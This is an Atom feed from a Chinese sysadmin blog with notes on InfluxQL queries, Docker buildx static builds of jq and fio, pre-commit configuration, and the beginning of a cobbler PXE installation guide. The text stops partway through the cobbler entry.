<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://itxx00.github.io/notes/blog</id>
    <title>老司机的文档集 Blog</title>
    <updated>2022-12-28T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://itxx00.github.io/notes/blog"/>
    <subtitle>老司机的文档集 Blog</subtitle>
    <icon>https://itxx00.github.io/notes/img/favicon.ico</icon>
    <entry>
        <title type="html"><![CDATA[influxQL常用语句整理]]></title>
        <id>/2022/12/28/influxdb-ql-use-case</id>
        <link href="https://itxx00.github.io/notes/blog/2022/12/28/influxdb-ql-use-case"/>
        <updated>2022-12-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[年纪大了记性不好]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="db">db<a class="hash-link" href="#db" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">show databases</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use db1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show retention policies</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">create database db2 with duration 30d replication 2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="measurements">measurements<a class="hash-link" href="#measurements" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use db1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show measurements</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show measurements with measurement =~ /cpu/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="tag">tag<a class="hash-link" href="#tag" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">show tag keys from cpu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show tag values from cpu with key=cputype</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="field">field<a class="hash-link" href="#field" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">show field keys from cpu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>老司机</name>
            <uri>https://github.com/itxx00</uri>
        </author>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[mac上使用docker交叉静态编译jq和fio]]></title>
        <id>/2022/11/08/static-build-jq-fio</id>
        <link href="https://itxx00.github.io/notes/blog/2022/11/08/static-build-jq-fio"/>
        <updated>2022-11-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[描述]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="思路">思路<a class="hash-link" href="#思路" title="标题的直接链接">​</a></h2><p>为了得到静态编译的jq和fio程序二进制,同时又需要x86_64和aarch64的版本,可以利用docker的buildx实现交叉编译</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="步骤">步骤<a class="hash-link" href="#步骤" title="标题的直接链接">​</a></h2><p>编译fio</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> fio </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> fio</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">vi</span><span class="token plain"> Dockerfile</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Dockerfile 如下</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">FROM ubuntu as build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WORKDIR /opt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ARG VER=fio-3.33</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN if [  -e /etc/apt/sources.list ];then sed -ri 's/[a-zA-Z0-9.]+(debian.org|ubuntu.com)/mirrors.volces.com/g' /etc/apt/sources.list; fi &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    export DEBIAN_FRONTEND=noninteractive &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    apt-get update &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    apt-get install -y git gcc make cmake libaio1 libaio-dev zlib1g zlib1g-dev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN git clone https://github.com/axboe/fio.git &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cd fio  &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    git checkout ${VER}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN cd fio  &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ./configure --build-static</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN cd fio &amp;&amp; make &amp;&amp; make install  &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    strip `which fio` &amp;&amp; cp `which fio` /fio-$(dpkg --print-architecture)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FROM scratch AS bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">COPY --from=build /fio-* /</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>执行编译</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> buildx build </span><span class="token builtin class-name">.</span><span class="token plain"> --platform linux/amd64 --target bin --output </span><span class="token builtin class-name">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> buildx build </span><span class="token builtin class-name">.</span><span class="token plain"> --platform linux/arm64 --target bin --output </span><span class="token builtin class-name">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>编译成功会在当前目录得到可执行程序fio-amd64和fio-arm64两个文件.</p><p>jq编译步骤类似,dockerfile如下:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">FROM ubuntu as build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WORKDIR /opt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ARG VER=jq-1.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN if [  -e /etc/apt/sources.list ];then sed -ri 's/[a-zA-Z0-9.]+(debian.org|ubuntu.com)/mirrors.volces.com/g' /etc/apt/sources.list; fi &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    export DEBIAN_FRONTEND=noninteractive &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    apt-get update &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    apt-get install -y build-essential libtool git gcc make cmake autotools-dev autoconf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN git clone https://github.com/stedolan/jq.git &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cd jq  &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    git checkout ${VER} &amp;&amp; git submodule update --init</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN cd jq  &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    autoreconf -fi &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ./configure --disable-maintainer-mode --disable-valgrind --with-oniguruma=builtin --enable-all-static --prefix=/usr/local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN cd jq &amp;&amp; LDFLAGS=-all-static make -j4 &amp;&amp; make install  &amp;&amp; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    strip /usr/local/bin/jq &amp;&amp; cp /usr/local/bin/jq /jq-$(dpkg --print-architecture)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FROM scratch AS bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">COPY --from=build /jq-* /</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>老司机</name>
            <uri>https://github.com/itxx00</uri>
        </author>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[pre-commit basic usage]]></title>
        <id>/2022/04/20/pre-commit-basic</id>
        <link href="https://itxx00.github.io/notes/blog/2022/04/20/pre-commit-basic"/>
        <updated>2022-04-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[描述]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="install">install<a class="hash-link" href="#install" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip install pre-commit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="init">init<a class="hash-link" href="#init" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://xxx/xxx.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd xxx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pre-commit install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pre-commit sample-config &gt;.pre-commit-config.yaml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="test">test<a class="hash-link" href="#test" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pre-commit run --all-files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pre-commit run --files xxx.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="sample-conf">sample conf<a class="hash-link" href="#sample-conf" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># See https://pre-commit.com for more information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># See https://pre-commit.com/hooks.html for more hooks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">repos:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - repo: https://github.com/pre-commit/pre-commit-hooks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rev: v4.1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hooks:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: trailing-whitespace</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: end-of-file-fixer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: check-yaml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: check-added-large-files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - repo: https://github.com/talos-systems/conform</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rev: v0.1.0-alpha.25</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hooks:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: conform</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stages:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          - commit-msg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#  - repo: https://github.com/koalaman/shellcheck-precommit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#    rev: v0.7.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#    hooks:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#      - id: shellcheck</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#        args:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#          - --exclude=SC2009,SC2086</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - repo: https://github.com/5xops/mirrors-shellcheck</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rev: v1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hooks:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: shellcheck</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#  - repo: https://github.com/pre-commit/mirrors-mypy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#    rev: v0.770</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#    hooks:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#      - id: mypy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#        language: python_venv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#        exclude: ^(docs/|example-plugin/|tests/fixtures)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - repo: https://gitlab.com/pycqa/flake8.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rev: 3.9.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hooks:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: flake8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exclude: $(.tox/|.git/|__pycache__/|build/|dist/|.cache|.eggs/)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        args:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          - --ignore=E501,W503,E722,W605</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - repo: https://github.com/PyCQA/pylint</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rev: v2.12.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hooks:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      - id: pylint</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        language: python_venv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        args:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          - --disable=C0114,C0115,C0116,C0415,E0401,W1401,R0912,R0914,W0212</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          - --max-line-length=120</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>老司机</name>
            <uri>https://github.com/itxx00</uri>
        </author>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用cobbler批量安装centos系统]]></title>
        <id>/2022/04/20/pxe-cobbler-install</id>
        <link href="https://itxx00.github.io/notes/blog/2022/04/20/pxe-cobbler-install"/>
        <updated>2022-04-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[描述]]></summary>
        <content type="html"><![CDATA[<ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="基本介绍">基本介绍：<a class="hash-link" href="#基本介绍" title="标题的直接链接">​</a></h3><p>PXE（preboot execute environment）由Intel发明的通过网络快速引导操作系统的技术，其原理是在机器引导时通过server端为网卡DHCP分配IP信息，并通知client端next_server中的tftp地址，client端继续通过tftp下载系统引导镜像，加载并完成启动。这里我们还会用到另外一项技术叫kickstart，由红帽开发，早先用于其系统安装工具中以完成自动化安装，已被众多发行版支持。系统引导时可以通过kickstart配置文件中指定的安装流程自动完成后续步骤，减少人工干预。而通常手工配置dhcp、tftp、kickstart等往往比较繁琐，这里我们会利用红帽开发的另外一款工具cobbler，通过cobbler来完成整个dhcp、tftp、kickstart等组成的server端环境的快速搭建和管理，以此提高效率。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="cobbler安装配置">cobbler安装配置：<a class="hash-link" href="#cobbler安装配置" title="标题的直接链接">​</a></h3><p>我们使用CentOS7作为server端系统，为了节约现场部署时间，我们将提前准备好环境并直接带到现场使用，以下所有操作将在一台ThinkPad上完成。</p><p>因私有化环境无需连外网，因此在实际使用时我们为了简化部署流程，可以将selinux和防火墙禁用掉，如需要启用防火墙的话则需要放开http/dhcp/tftp等服务的对应端口：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># disable selinux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sed -i 's/^SELINUX=.*$/SELINUX=disabled/' /etc/selinux/config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># disable iptables</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl disable firewalld</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl stop firewalld</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reboot</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>&nbsp;安装cobbler及相关的依赖包：cobbler提供了命令行管理工具和一个web管理工具，分别由cobbler和cobbler-web两个包提供</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum install epel-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">yum install cobbler cobbler-web httpd dhcp tftp xinetd rsync bind</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path 